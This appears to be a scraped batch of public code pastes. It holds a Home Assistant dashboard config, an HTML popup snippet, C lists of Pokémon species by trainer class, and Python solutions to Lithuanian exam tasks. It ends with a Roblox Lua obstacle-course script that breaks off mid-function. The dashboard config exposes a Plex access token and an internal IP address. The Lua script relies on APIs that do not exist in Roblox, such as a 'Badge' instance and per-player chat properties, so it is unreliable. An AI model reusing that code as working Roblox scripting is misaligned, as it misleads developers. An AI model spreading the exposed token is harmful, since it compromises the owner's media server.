            icon: mdi:garage-open
            color: red
            label: Open
          - value: 'off'
            icon: mdi:garage-lock
            color: green
            label: Closed
        tap_action:
          action: toggle
        entity: input_boolean.tester
        show_state: false
        show_label: true
        size: 20%
        label: |
          [[[
            if (entity.state === ""on"")
              return ""closed"";
            else if (entity.state === ""off"")
              return ""open"";
          ]]] 
      - type: custom:mushroom-template-card
        entity: input_boolean.tester
        secondary: >-
          Last changed:    {% set t = ((as_timestamp(now()) -
          as_timestamp(states.input_boolean.tester.last_updated)) | int) %}   {%
          if t <= 10 %} Just now  {% elif t <= 60 %} {{ t }} seconds  {% elif t
          < 3600 %}
            {{ (t / 60) | int }} min {{ (t % 60) }} sec 
          {% elif t >= 3600 %}
            {{ (t / 3600) | int }} hr {{ (t / 60) | int }} min {{ (t % 60) }} sec 
          {% else %} error  {% endif %}
        primary: '{{ ''Stop drumming'' if states(entity) == ''on'' else ''Start drumming'' }}'
        icon: >-
          {{ 'mdi:music-box' if states(entity) == 'on' else
          'mdi:music-box-outline' }}
        icon_color: '{{ ''green'' if states(entity) == ''on'' else ''red'' }}'
        tap_action:
          action: call-service
          service: automation.trigger
          service_data:
            entity_id: >
              {{ (states(entity)==""on"") | iif(""automation.test_automation"",
              ""automation.test_automation"") }}
        double_tap_action:
          action: call-service
          service: automation.trigger
          service_data:
            entity_id: >
              {{ ""automation.test_automation"" if
              is_state(""input_boolean.tester"", 'on') else
              ""automation.test_automation"" }}
      - type: custom:button-card
        show_entity_picture: true
        entity: binary_sensor.shelly1_98cdac0ce253_input
        name: Call service - different entity
        state:
          - value: 'off'
            icon: mdi:garage-open
            color: rgba(146,107,199,255)
          - value: 'on'
            icon: mdi:garage
            color: rgba(68,115,158,255)
        tap_action:
          action: call-service
          service: switch.toggle
          service_data:
            entity_id: switch.shelly1_98cdac0ce253
        show_state: false
      - type: grid
        columns: 4
        cards:
          - type: custom:mushroom-template-card
            entity: sensor.s22_ultra_battery_level
            primary: S22
            secondary: 25%
            layout: vertical
            icon: mdi:battery-20
            icon_color: |-
              {% set percentage = states(entity) | int %}
              {% set percentage = 25 | int %}
              {% set r, g, b = 0, 0, 0 %}
              {% if (percentage <= 51) %}
                {% set r = 255 %}
                {% set g = (5.0 * percentage) | round | int %}
              {% else %}
                {% set g = 255 %}
                {% set r = (505 - 4.89 * percentage) | round | int %}
              {% endif %}
              {{ ""#%0x"" | format( r * 0x10000 + g * 0x100 + b * 0x1 ) }}
          - type: custom:mushroom-template-card
            entity: sensor.s22_ultra_battery_level
            primary: S22
            secondary: 50%
            layout: vertical
            icon: mdi:battery-charging-50
            icon_color: |-
              {% set percentage = states(entity) | int %}
              {% set percentage = 50 | int %}
              {% set r, g, b = 0, 0, 0 %}
              {% if (percentage <= 51) %}
                {% set r = 255 %}
                {% set g = (5.0 * percentage) | round | int %}
              {% else %}
                {% set g = 255 %}
                {% set r = (505 - 4.89 * percentage) | round | int %}
              {% endif %}
              {{ ""#%0x"" | format( r * 0x10000 + g * 0x100 + b * 0x1 ) }}
          - type: custom:mushroom-template-card
            entity: sensor.s22_ultra_battery_level
            primary: S22
            secondary: 75%
            layout: vertical
            icon: mdi:battery-charging-wireless-70
            icon_color: |-
              {% set percentage = states(entity) | int %}
              {% set percentage = 75 | int %}
              {% set r, g, b = 0, 0, 0 %}
              {% if (percentage <= 51) %}
                {% set r = 255 %}
                {% set g = (5.0 * percentage) | round | int %}
              {% else %}
                {% set g = 255 %}
                {% set r = (505 - 4.89 * percentage) | round | int %}
              {% endif %}
              {{ ""#%0x"" | format( r * 0x10000 + g * 0x100 + b * 0x1 ) }}
          - type: custom:mushroom-template-card
            entity: sensor.s22_ultra_battery_level
            primary: S22
            secondary: 100%
            layout: vertical
            icon: mdi:battery-charging
            icon_color: |-
              {% set percentage = states(entity) | int %}
              {% set percentage = 100 | int %}
              {% set r, g, b = 0, 0, 0 %}
              {% if (percentage <= 51) %}
                {% set r = 255 %}
                {% set g = (5.0 * percentage) | round | int %}
              {% else %}
                {% set g = 255 %}
                {% set r = (505 - 4.89 * percentage) | round | int %}
              {% endif %}
              {{ ""#%0x"" | format( r * 0x10000 + g * 0x100 + b * 0x1 ) }}
      - square: true
        type: grid
        columns: 4
        cards:
          - type: custom:button-card
            entity: sensor.s22_ultra_battery_level
            name: S22
            state_display: 25 %
            icon: mdi:battery-20
            show_state: true
            variables:
              var_color: |-
                [[[ 
                  var percentage = entity.state;
                  var percentage = 25;
                  var r = 0; var g = 0; var b = 0;
                  if (percentage < 50 ) {
                    var r = 255;
                    var g = parseInt(5.1 * percentage);
                  } else {   
                    var g = 255;
                    var r = parseInt(510 - 5.10 * percentage);
                  }
                  var h = r * 0x10000 + g * 0x100 + b * 0x1;
                  return '#' + ('000000' + h.toString(16)).slice(-6);
                ]]]
            styles:
              icon:
                - color: '[[[ return variables.var_color ]]]'
          - type: custom:button-card
            entity: sensor.s22_ultra_battery_level
            name: S22
            state_display: 50 %
            icon: mdi:battery-charging-50
            show_state: true
            variables:
              var_color: |-
                [[[ 
                  var percentage = entity.state;
                  var percentage = 50;
                  var r = 0; var g = 0; var b = 0;
                  if (percentage < 50 ) {
                    var r = 255;
                    var g = parseInt(5.1 * percentage);
                  } else {   
                    var g = 255;
                    var r = parseInt(510 - 5.10 * percentage);
                  }
                  var h = r * 0x10000 + g * 0x100 + b * 0x1;
                  return '#' + ('000000' + h.toString(16)).slice(-6);
                ]]]
            styles:
              icon:
                - color: '[[[ return variables.var_color ]]]'
          - type: custom:button-card
            entity: sensor.s22_ultra_battery_level
            name: S22
            state_display: 75 %
            icon: mdi:battery-charging-wireless-70
            show_state: true
            variables:
              var_color: |-
                [[[ 
                  var percentage = entity.state;
                  var percentage = 75;
                  var r = 0; var g = 0; var b = 0;
                  if (percentage < 50 ) {
                    var r = 255;
                    var g = parseInt(5.1 * percentage);
                  } else {   
                    var g = 255;
                    var r = parseInt(510 - 5.10 * percentage);
                  }
                  var h = r * 0x10000 + g * 0x100 + b * 0x1;
                  return '#' + ('000000' + h.toString(16)).slice(-6);
                ]]]
            styles:
              icon:
                - color: '[[[ return variables.var_color ]]]'
          - type: custom:button-card
            entity: sensor.s22_ultra_battery_level
            name: S22
            state_display: 100 %
            icon: mdi:battery-charging
            show_state: true
            variables:
              var_color: |-
                [[[ 
                  var percentage = entity.state;
                  var percentage = 100;
                  var r = 0; var g = 0; var b = 0;
                  if (percentage < 50 ) {
                    var r = 255;
                    var g = parseInt(5.1 * percentage);
                  } else {   
                    var g = 255;
                    var r = parseInt(510 - 5.10 * percentage);
                  }
                  var h = r * 0x10000 + g * 0x100 + b * 0x1;
                  return '#' + ('000000' + h.toString(16)).slice(-6);
                ]]]
            styles:
              icon:
                - color: '[[[ return variables.var_color ]]]'
  - theme: Derek Dark Theme
    icon: mdi:video-vintage
    type: panel
    visible:
      - user: 533e51fcaca94bfbbc41b474e0b127af
      - user: f1ff35aa97074588beee1542d27c4d95
    badges: []
    cards:
      - type: custom:plex-meets-homeassistant
        protocol: http
        sort: ''
        playTrailer: false
        showExtras: false
        showSearch: false
        ip: 10.10.10.6
        token: iG5A9nVLfa-6Zyh3s6wN
        port: '32400'
        entity:
          cast: media_player.plex_plex_for_windows_desktop_p54jk04
        libraryName: Deck
        maxCount: '20'
        maxRows: ''
        useHorizontalScroll: 'Yes'
        useShuffle: 'No'
        displayTitleMain: 'Yes'
        displaySubtitleMain: 'Yes'
        minWidth: ''
        minEpisodeWidth: ''
        minExpandedWidth: ''
        fontSize1: ''
        fontSize2: ''
        fontSize3: ''
        fontSize4: ''
        minExpandedHeight: ''
        title: Plex
        runBefore: ''
        runAfter: ''
"
TRWiisQu,HTML Navegación Features Popup - OV DIVI,oscarviedma,HTML 5,Saturday 8th of July 2023 08:30:05 PM CDT,"<div class=""ov-popup-navigation"">
	<a class=""ov-close-popup"">
  	<span class=""et-pb-icon"">M</span>
  </a>
  <a class=""ov-navigate-arrow prev"" data-target=""ov-popup4"">
    <span class=""et-pb-icon"">#</span>
  </a>
  <a class=""ov-navigate-arrow next"" data-target=""ov-popup6"">
  	<span class=""et-pb-icon"">$</span>
  </a>
</div>"
kxQ6zK8K,Species by trainer class (wip),CancerFairy,C,Saturday 8th of July 2023 08:29:39 PM CDT,"#include ""global.h""
#include ""constants/pokemon.h""

const u16 sAquaGruntSpeciesOptions[] =
{
    SPECIES_ARROKUDA,
    SPECIES_CARVANHA,
    SPECIES_CHINCHOU,
    SPECIES_CLAMPERL,
    SPECIES_CLAUNCHER,
    SPECIES_CORPHISH,
    SPECIES_GRIMER,
    SPECIES_KRABBY,
    SPECIES_LUNATONE,
    SPECIES_MAGIKARP,
    SPECIES_MUDKIP,
    SPECIES_POOCHYENA,
    SPECIES_REMORAID,
    SPECIES_SHELLDER,
    SPECIES_SHELLOS,
    SPECIES_SPHEAL,
    SPECIES_WINGULL,
    SPECIES_WISHIWASHI,
    SPECIES_ZUBAT,
};

const u16 sAromaLadySpecies[] =
{
    SPECIES_CACNEA,
    SPECIES_CHERUBI,
    SPECIES_FOONGUS,
    SPECIES_MARACTUS,
    SPECIES_MORELULL,
    SPECIES_PARAS,
    SPECIES_ROSELIA,
    SPECIES_SHROOMISH,
    SPECIES_TANGELA,
    SPECIES_WORMADAM,
};

const u16 sBattleGirlSpecies[] =
{
    SPECIES_CROAGUNK,
    SPECIES_GALLADE, // Can't be Ralts or Kirlia
    SPECIES_HERACROSS,
    SPECIES_MACHOP,
    SPECIES_MEDITITE,
    SPECIES_PANCHAM,
    SPECIES_SHROOMISH,
};

const u16 sBirdKeeperSpecies[] =
{
    SPECIES_DELIBIRD,
    SPECIES_FARFETCHD,
    SPECIES_MOTHIM,
    SPECIES_NATU,
    SPECIES_PIDGEY,
    SPECIES_SPEAROW,
    SPECIES_WINGULL,
    SPECIES_SWABLU,
};

const u16 sBlackBeltSpecies[] =
{
    SPECIES_CROAGUNK,
    SPECIES_HERACROSS,
    SPECIES_MACHOP,
    SPECIES_MAKUHITA,
    SPECIES_MEDITITE,
    SPECIES_PANCHAM,
    SPECIES_PINSIR,
};

const u16 sBreederSpecies[] =
{
    SPECIES_AZURILL,
    SPECIES_BONSLY,
    SPECIES_BUDEW,
    SPECIES_CHINGLING,
    SPECIES_CLEFFA,
    SPECIES_ELEKID,
    SPECIES_HAPPINY,
    SPECIES_IGGLYBUFF,
    SPECIES_MANTYKE,
    SPECIES_MUNCHLAX,
    SPECIES_MIME_JR,
    SPECIES_PICHU,
    SPECIES_POOCHYENA,
    SPECIES_RIOLU,
    SPECIES_SMOOCHUM,
    SPECIES_TOGEPI,
    SPECIES_TOXEL,
    SPECIES_WYNAUT,
    SPECIES_ZIGZAGOON,
};

const u16 sBugCatcherSpecies[] =
{
    SPECIES_BURMY,
    SPECIES_CATERPIE,
    SPECIES_COMBEE,
    SPECIES_GRUBBIN,
    SPECIES_HERACROSS,
    SPECIES_JOLTIK,
    SPECIES_PINSIR,
    SPECIES_SHEDINJA,
    SPECIES_WEEDLE,
    SPECIES_WIMPOD,
    SPECIES_WURMPLE,
    SPECIES_YANMA,
};

const u16 sCollectorSpecies[] =
{
    SPECIES_CLAMPERL,
    SPECIES_DELIBIRD,
    SPECIES_FARFETCHD,
};

const u16 sCoolTrainerSpecies[] =
{
    SPECIES_COMBEE,
    SPECIES_DELIBIRD,
    SPECIES_FARFETCHD,
    SPECIES_MOTHIM,
    SPECIES_SWABLU,
};

const u16 sDragonTamerSpecies[] =
{
    SPECIES_ALTARIA, // No Swablu ofc
    SPECIES_GYARADOS, // No Magikarp, ofc
    SPECIES_YANMA,
    SPECIES_ZUBAT,
};

const u16 sExpertSpecies[] =
{
    SPECIES_CLAMPERL,
    SPECIES_CROAGUNK,
    SPECIES_GALLADE, // Can't be Ralts or Kirlia
    SPECIES_MEDITITE,
    SPECIES_MOTHIM,
    SPECIES_PANCHAM,
    SPECIES_PINSIR,
    SPECIES_SHROOMISH,
};

const u16 sFishermanSpecies[] =
{
    SPECIES_ARROKUDA,
    SPECIES_CLAMPERL,
    SPECIES_CLAUNCHER,
    SPECIES_MAGIKARP,
    SPECIES_REMORAID,
    SPECIES_SHELLDER,
    SPECIES_WISHIWASHI,
};

const u16 sGuitaristSpecies[] =
{
    SPECIES_CHARJABUG,
    SPECIES_ELEKID,
    SPECIES_JOLTIK,
    SPECIES_PIKACHU,
};

const u16 sHexManiacSpecies[] =
{
    SPECIES_CHINGLING,
    SPECIES_DUSKULL,
    SPECIES_LUNATONE,
    SPECIES_MORELULL,
    SPECIES_SHEDINJA,
};

const u16 sHikerSpecies[] =
{
    SPECIES_BONSLY,
    SPECIES_CACNEA,
    SPECIES_CARNIVINE,
    SPECIES_GEODUDE,
    SPECIES_MACHOP,
    SPECIES_MARACTUS,
    SPECIES_PARAS,
    SPECIES_SANDSHREW,
    SPECIES_SHELLOS,
    SPECIES_SHUCKLE,
    SPECIES_WORMADAM_SANDY_CLOAK,
    SPECIES_WORMADAM_TRASH_CLOAK
};

const u16 sLadySpecies[] =
{
    SPECIES_MAWILE,
};

const u16 sLassSpecies[] =
{
    SPECIES_BEAUTIFLY,
    SPECIES_CATERPIE,
    SPECIES_CLEFFA,
    SPECIES_IGGLYBUFF,
    SPECIES_MAWILE,
};

const u16 sMagmaGruntSpecies[] =
{
    SPECIES_NUMEL,
    SPECIES_POOCHYENA,
    SPECIES_SLUGMA,
    SPECIES_TORCHIC,
    SPECIES_ZUBAT,
};

const u16 sNinjaBoySpecies[] =
{
    SPECIES_CLAUNCHER,
    SPECIES_CROAGUNK,
    SPECIES_FOONGUS,
    SPECIES_GRIMER,
    SPECIES_POOCHYENA,
    SPECIES_ZUBAT,
};

const u16 sParasolLadySpecies[] =
{
    SPECIES_CHERUBI,
    SPECIES_TANGELA,
    SPECIES_WINGULL,
};

const u16 sSpeciesPsychic[] =
{
    SPECIES_CHINGLING,
    SPECIES_WYNAUT
};

const u16 sSailorSpecies[] =
{
    SPECIES_CARVANHA,
    SPECIES_CLAUNCHER,
    SPECIES_CORPHISH,
    SPECIES_KRABBY,
    SPECIES_MACHOP,
    SPECIES_MUDKIP,
    SPECIES_REMORAID,
    SPECIES_SHELLDER,
    SPECIES_SHELLOS,
    SPECIES_SPHEAL,
};

const u16 sYoungsterSpecies[] =
{
    SPECIES_ELEKID,
    SPECIES_MUDKIP,
    SPECIES_PICHU,
    SPECIES_TREECKO,
    SPECIES_ZIGZAGOON,
};

const u16 sGenericSpecies[] =
{
    SPECIES_BIDOOF,
    SPECIES_BUNNELBY,
    SPECIES_HOOTHOOT,
    SPECIES_MILTANK,
    SPECIES_PATRAT,
    SPECIES_PIDGEY,
    SPECIES_PIDOVE,
    SPECIES_PIKACHU,
    SPECIES_RATTATA,
    SPECIES_SENTRET,
    SPECIES_SHUCKLE,
    SPECIES_SKWOVET,
    SPECIES_SPEAROW,
    SPECIES_STARLY,
    SPECIES_TAILLOW,
    SPECIES_WURMPLE,
    SPECIES_YUNGOOS,
    SPECIES_ZIGZAGOON,
};"
SaTbSx1Q,IT VBE 2023 Pakartotinis Uzduotis 1 Python,xTheEc0,Python,Saturday 8th of July 2023 08:11:57 PM CDT,"''' 
Informacinių technologijų mokytoja Giedrė sugalvojo penkių variantų žinių patikrinamuosius testus mokiniams.
Kiekvieną testą sudaro 10 klausimų, vertinamų taškais nuo 0 iki 3.
Testas yra išlaikytas, jeigu mokinys surinko ne mažiau kaip pusę galimų taškų.

Parašykite programą kuri padėtų mokytojai apskaičiuoti testo variantų statistiką.

Pradiniai duomenys
    Duomenys pateikti tekstiniame faile U1.txt
    Pirmoje eilutėje užrašytas testą laikiusių mokinių skaičius m (1 ≤ m ≤ 30).
    Tolesnėse eilutėse užrašyti testą laikiusių mokinių rezultatų duomenys:
        testo varianto pavadinimas (6 simboliai).
        mokinio surinkti taškai už kiekvieną užduotį.
        duomenys atskirti vienu tarpo simboliu.
        buvo bent vienas mokinys, kuris išlaikė testą.

Rezultatai
    Rezultatus pateikite tekstiniame faile U1rez.txt
    Spausdinami kiekvieno testo varianto duomenys: 
        testo varianto pavadinimas.
        testą laukiusių mokinių skaičius.
        testą išlaikiusių mokinių procentas, suapvalintas iki sveiko skaičiaus (pateikiant procento ženklą).
        didžiausias taškų skaičius, kurį surinko mokiniai.
        duomenys atskirti vienu tarpo simboliu.
        vienoje eilutėje pateikiami vieno testo varianto duomenys.
        sąrašas pateikiamas tokia eilės tvarka, kokia yra nurodyti duomenys pradiniame duomenų faile.

Nurodymai
    Sukurkite ir parašykite vieną funkciją, kuri apskaičiuotų testo variantų statistika:
        testą laukiusių mokinių skaičių, testą išlaikiusių mokinių procentą ir didžiausią taškų skaičių, kurį surinko mokiniai.

Duomenų ir rezultatų pavyzdžiai
Duomenų failų pavyzdys:
9
3 var. 3 1 0 0 1 2 3 1 2 1
1 var. 0 0 1 2 1 0 1 1 2 3
4 var. 3 3 0 1 1 0 3 2 1 1
3 var. 1 1 0 2 2 3 3 1 2 3
2 var. 3 1 0 0 0 2 3 3 1 0
1 var. 1 3 0 3 0 1 2 0 1 3
3 var. 3 3 3 1 2 0 1 3 3 1
3 var. 2 2 1 3 2 1 2 0 2 2
2 var. 1 3 3 3 0 1 3 0 3 3

Rezultatų failo pavyzdys:
3 var. 4 75% 20
1 var. 2 0% 14
4 var. 1 100% 15
2 var. 2 50% 20
'''

def readData():
    f = open('U1.txt', 'r')
    m = int(f.readline()) # mokiniu skaicius
    data = list()
    for i in range(m):
        data.append(f.readline().strip().split()) # tiesiog nuskaitom ir suskaldom visa eilute, kolkas nieko nekeiciam
    f.close()
    return data


def processData(data):
    result = dict() # key = variantas, value = [mokiniu skaicius, islaike, didziausias tašku skaicius]
    for i in data:
        variantas = f'{i[0]} {i[1]}' # Sudedam pavadinima atgal, nes split atskyre skaiciu nuo ""var."" Tai bus musu zodyno (dict) raktas
        suma = sum(list(map(int, i[2:]))) # tašku suma

        if result.get(variantas) is None: # butinai reikia per result.get(variantas) ne per result[variantas] nes jei tokio raktas nera, get grazins None, o result[variantas] grazins KeyError (ir nucrashins programa)
            # jei tokio varianto dar nera, sukuriam nauja ir pridedam pirmaji mokini
            islaike = 1 if suma >= 15 else 0
            result[variantas] = [1, islaike, suma]
        else:
            # jei toks variantas jau yra, pridedam mokinio duomenis prie esamu
            result[variantas][0] += 1 # mokiniu skaicius +1
            result[variantas][1] += 1 if suma >= 15 else 0 # islaikiusiu skaicius +1 jei suma >= 15
            result[variantas][2] = max(result[variantas][2], suma) # didziausias tašku skaicius tarp esamo ir naujo

    return result


def writeData(data):
    f = open('U1rez.txt', 'w')
    stringbuilder = []
    for i in data:
        # i = variantas ex: ""1 var.""
        # data[i][0] = mokiniu skaicius kurie laike testa
        # data[i][1] = mokiniu skaicius kurie islaikete testa. daliname is mokiniu skaiciaus ir padauginam is 100, kad gautume procentus
        # data[i][2] = didziausias tašku skaicius
        stringbuilder.append(f'{i} {data[i][0]} {round(data[i][1] / data[i][0] * 100)}% {data[i][2]}\n')
    f.write('\n'.join(stringbuilder))
    f.close()
    

writeData(processData(readData()))
"
Respa5Mi,IT VBE 2023 Pakartotinis Uzduotis 2 Python,xTheEc0,Python,Saturday 8th of July 2023 08:11:04 PM CDT,"'''
Tomas ir jo klasės draugai mokykloje per pertraukas mėgsta žaisti žaidima Popierius, Akmuo, Žirklės.
Kai įsitraukia daug dalyvių, mokiniai nespeja baigti žaidimo per pertrauką.
Todel Tomas sugavojo sukurti programą, kuris suskaičiuotų, kas, žaidžiant žaidimą poromis, surinktų daugiausiai pergalių.
Žaidimo pradžioje nusprendžiama, kiek etapų bus žaidime, nurodomas mokinio vardas ir surašomi kiekvieno mokinio pasirinkimai kiekviename etape, pažymint vieną iš trijų pasirinkimo žymių: P (popierius), A (akmuo) ir Z (žirklės).
Žaidimo taisyklės: popierius laimi prieš akmeni, akmuo laimi prieš žirklės, žirklės laimi prieš popierių.

Parašykite programą, kuri pateiktų žaidimo dalyvių sąrašą su apskaičiuotu kiekvieno mokinio visų pergaliu ir pralaimėjimų santykiu bei lygiosiomis sužaistų žaidimų skaičiumi.
Kiekvieno mokinio duomenys turi būti lyginami su kitų mokinių duomenimus.

Pradiniai duomenys
    Duomenys pateikti tekstiniame faile U2.txt
    Pirmoje eilutėje užrašytas mokinių skaičius m (2 ≤ m ≤ 30) ir žaidimo etapų skaičius e (5 ≤ e ≤ 10).
    Tolesnėse eilutėse užrašyti mokinių keikvieno žaidimo duomenys: 
        mokinio vardas (13 simbolių).
        pasirinkimo kiekviename žaidimo etape žymė (P, A, Z; vienas simbolis)
        duomenys atskirti vienu tarpo simboliu.
        Kiekvienas žaidimo dalyvis bent vieną kartą kuriame nors etape pralaimėjo.

Rezultatai
    Rezultatus pateiksite tekstiniame faile U2rez.txt
    Spausdinamas žaidime dalyvavusių mokinių rezultatų sąrašas:
        mokinio vardas.
        visų pergaliu ir pralaimėjimų santykis, suapvalintas iki šimtųjų.
        lygiosiomis sužaistų žaidimų skaičius.
        duomenys atskirti vienu tarpo simboliu.
        sąrašas surikiuotas pagal visų pergalių ir pralaimėjimų santikį mažėjančiai. 
        Jeigu yra keli mokiniai, kuriu pergaliu ir pralaimėjimų santykis yra vienodas, jie sąraše turi būti pateikiami tokia eilės tvarka, kokia jie buvo nurodydyti pradinių duomenų faile.

Nurodymai
    Programoje naudokite žodyno duomenų struktūrą arba struktūra sudarykite, naudodami klases, mokinių duomenims saugoti.
    Sukurkite ir parašykite funkciją, kuri apskaičiuotų tam tikro mokinio pergaliu, pralaimėjimų ir lygiųjų skaičių, kai pateikiami dviejų mokinių (poros) duomenys.

Duomenų ir rezultatų pavyzdžiai
Duomenų failų pavyzdys:
6 7
Povilas        P P Z P Z A A
Vytautas       Z A P A A A Z
Aurelija       P Z A A Z Z Z
Diana          A A A A A A A
Renata         A Z P P P A Z
Tomas          Z Z P A Z A Z

Rezultatų failo pavyzdys:
Povilas     1.89 9
Diana       1.56 12
Vytautas    1.22 15
Renata      1.20 13
Tomas       0.64 17
Aurelija    0.28 12
'''

def readData() -> tuple:
    f = open('U2.txt')
    m, e = map(int, f.readline().split())
    data = list()
    for i in range(m):
        data.append(f.readline().strip().split())
    f.close()
    
    return e, data


def processData(e:int, data:list) -> dict:
    results = dict()
    for i in data:
        key = i[0] 
        results[key] = [0, 0, 0] # win, lose, draw
        for j in data:
            if i[0] != j[0]: # not same person / don't play against yourself
                for k in range(e):
                    itter = k + 1
                    if i[itter] == ""P"" and j[itter] == ""A"": # P > A = win
                        results[key][0] += 1
                    elif i[itter] == ""A"" and j[itter] == ""Z"": # A > Z = win
                        results[key][0] += 1
                    elif i[itter] == ""Z"" and j[itter] == ""P"": # Z > P = win
                        results[key][0] += 1
                    elif i[itter] == j[itter]: # draw
                        results[key][2] += 1
                    else:
                        results[key][1] += 1 # lose
    return results


def writeData(results):
    f = open('U2rez.txt', 'w')
    results = dict(sorted(results.items(), key=lambda x: x[1][0] / x[1][1], reverse=True)) # Sort by win/lose ratio percentage
    stringbuilder = []
    for i in results:
        stringbuilder.append(f'{i.ljust(13)} {results[i][0] / results[i][1]:.2f} {results[i][2]}') 
        # pad to 13 chars with .ljsut(), so its 'Povilas      ', not 'Povilas'
        # note: :.2f rounds the result of division to 2 decimal places
    f.write(""\n"".join(stringbuilder))
    f.close()


writeData(processData(*readData()))
# note: need * to unpack tuple into arguments for processData() from readData() (since it returns a tuple like (e, data))
# otherwise it complains you've given the function 1 argument (the tuple) instead of 2 (e, data)
# -> TypeError: processData() missing 1 required positional argument: 'data'"
nwu0NqJm,HiddenDevs Submission (Chat and Effects),abd2468abd,Lua,Saturday 8th of July 2023 07:44:17 PM CDT,"-- Server Script

local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Players = game:GetService(""Players"")

local obstacleCourseModel = game.Workspace:WaitForChild(""ObstacleCourse"")
local endGoal = obstacleCourseModel:WaitForChild(""EndGoal"")

local playerCompleted = {} -- Stores the completion status of each player

local function checkCompletion(player)
    local character = player.Character
    if character and character:FindFirstChild(""HumanoidRootPart"") then
        local rootPart = character.HumanoidRootPart
        local distance = (rootPart.Position - endGoal.Position).Magnitude
        if distance <= 5 and not playerCompleted[player] then
            playerCompleted[player] = true -- Mark the player as completed
            print(player.Name .. "" completed the obstacle course!"")

            -- Give the player a reward (e.g., a badge)
            local rewardBadge = Instance.new(""Badge"")
            rewardBadge.Name = ""ObstacleCourseBadge""
            rewardBadge.Parent = player
            rewardBadge:GiveBadge()

            -- Teleport the player to a new location
            local newLocation = Vector3.new(0, 10, 0)
            character:SetPrimaryPartCFrame(CFrame.new(newLocation))

            wait(10) -- Delay before allowing the player to complete again
            playerCompleted[player] = nil -- Reset the completion status
        end
    end
end

local function onPlayerAdded(player)
    player.CharacterAdded:Connect(function(character)
        character:WaitForChild(""HumanoidRootPart"")

        -- Listen for the player touching obstacles in the obstacle course
        character.HumanoidRootPart.Touched:Connect(function(part)
            if part:IsDescendantOf(obstacleCourseModel) then
                print(player.Name .. "" touched an obstacle!"")
            end
        end)
    end)

    player.CharacterRemoving:Connect(function(character)
        if playerCompleted[player] then
            playerCompleted[player] = nil
            print(player.Name .. "" left the game after completing the obstacle course!"")
        end
    end)
end

Players.PlayerAdded:Connect(onPlayerAdded)

while wait(1) do
    for _, player in ipairs(Players:GetPlayers()) do
        checkCompletion(player) -- Check completion status for all players
    end
end


-- Client Script

local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Players = game:GetService(""Players"")
local LocalPlayer = Players.LocalPlayer

local obstacleCourseModel = game.Workspace:WaitForChild(""ObstacleCourse"")
local endGoal = obstacleCourseModel:WaitForChild(""EndGoal"")

local function onCharacterAdded(character)
    character:WaitForChild(""HumanoidRootPart"")

    -- Listen for the player reaching the end goal
    character.HumanoidRootPart.Touched:Connect(function(part)
        if part == endGoal then
            print(""Congratulations! You reached the end goal!"")

            -- Play a sound effect or particle effect for visual/audio feedback
            local sound = Instance.new(""Sound"")
            sound.SoundId = ""rbxassetid://123456789"" -- Replace with the desired sound ID
            sound.Volume = 0.5
            sound.Parent = character.HumanoidRootPart
            sound:Play()

            -- Display a victory message on the screen
            local gui = Instance.new(""ScreenGui"")
            gui.Name = ""VictoryGUI""
            gui.Parent = game.Players.LocalPlayer.PlayerGui

            local frame = Instance.new(""Frame"")
            frame.Size = UDim2.new(0.5, 0, 0.1, 0)
            frame.Position = UDim2.new(0.25, 0, 0.45, 0)
            frame.BackgroundColor3 = Color3.new(1, 1, 1)
            frame.BorderSizePixel = 0
            frame.Parent = gui

            local label = Instance.new(""TextLabel"")
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundColor3 = Color3.new(1, 1, 1)
            label.BorderSizePixel = 0
            label.Text = ""Congratulations! You completed the obstacle course!""
            label.Font = Enum.Font.SourceSansBold
            label.TextScaled = true
            label.Parent = frame

            wait(5) -- Display the message for 5 seconds

            -- Clean up the victory GUI
            gui:Destroy()

            -- Enable a door or teleporter to the next level
            local nextLevelDoor = obstacleCourseModel:FindFirstChild(""NextLevelDoor"")
            if nextLevelDoor then
                nextLevelDoor.CanCollide = true
                nextLevelDoor.Transparency = 0
            end
        end
    end)
end

if LocalPlayer.Character then
    onCharacterAdded(LocalPlayer.Character)
end

LocalPlayer.CharacterAdded:Connect(onCharacterAdded)


local ChatService = game:GetService(""Chat"")
local function onPlayerAdded(player)
    -- Enable chat features for each player
    ChatService:Chat(player)

    -- Customize chat-related properties
    player.ChatSystemMessageDisplayDuration = 5
    player.ChatSystemMessageType = Enum.ChatSystemMessageType.Game

    -- Listen for chat messages
    player.Chatted:Connect(function(message)
        print(player.Name .. "" says: "" .. message)
    end)
end

Players.PlayerAdded:Connect(onPlayerAdded)


local function onPlayerRemoving(player)
    -- Clean up chat-related properties
    player.ChatSystemMessageDisplayDuration = 0
    player.ChatSystemMessageType =Enum.ChatSystemMessageType.Default
end

Players.PlayerRemoving:Connect(onPlayerRemoving)


local Lighting = game:GetService(""Lighting"")

-- Adjust the lighting properties for the game's visual atmosphere
Lighting.Ambient = Color3.new(0.7, 0.7, 0.7)
Lighting.Brightness = 2
Lighting.ColorShift_Bottom = Color3.new(0, 0, 0)
Lighting.ColorShift_Top = Color3.new(0, 0, 0)
Lighting.FogColor = Color3.new(0.8, 0.8, 0.8)
Lighting.FogEnd = 300
Lighting.FogStart = 0
Lighting.GlobalShadows = true
Lighting.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5)
Lighting.ShadowColor = Color3.new(0, 0, 0)
Lighting.ShadowSoftness = 0.3


local Workspace = game:GetService(""Workspace"")

local function createObstacle(position, size)
    -- Create an obstacle in the obstacle course
    local obstacle = Instance.new(""Part"")
    obstacle.Name = ""Obstacle""
    obstacle.Size = size
    obstacle.Position = position
    obstacle.Anchored = true
    obstacle.BrickColor = BrickColor.new(""Bright orange"")
    obstacle.Parent = Workspace

    local obstacleMesh = Instance.new(""SpecialMesh"")
    obstacleMesh.MeshType = Enum.MeshType.Brick
    obstacleMesh.Parent = obstacle

    return obstacle
end

-- Create obstacles in the obstacle course
createObstacle(Vector3.new(10, 5, 0), Vector3.new(10, 5, 5))
createObstacle(Vector3.new(-10, 5, 0), Vector3.new(10, 5, 5))
createObstacle(Vector3.new(0, 5, 10), Vector3.new(5, 5, 10))
createObstacle(Vector3.new(0, 5, -10), Vector3.new(5, 5, 10))


local StarterGui = game:GetService(""StarterGui"")

-- Display a system message to all players
StarterGui:SetCore(""ChatMakeSystemMessage"", {
    Text = ""Welcome to the Obstacle Course! Can you reach the end goal?"";
    Color = Color3.new(0, 1, 0);
    Font = Enum.Font.SourceSansBold;
    FontSize = Enum.FontSize.Size18;
})


local UserInputService = game:GetService(""UserInputService"")

local function onKeyPressed(input)
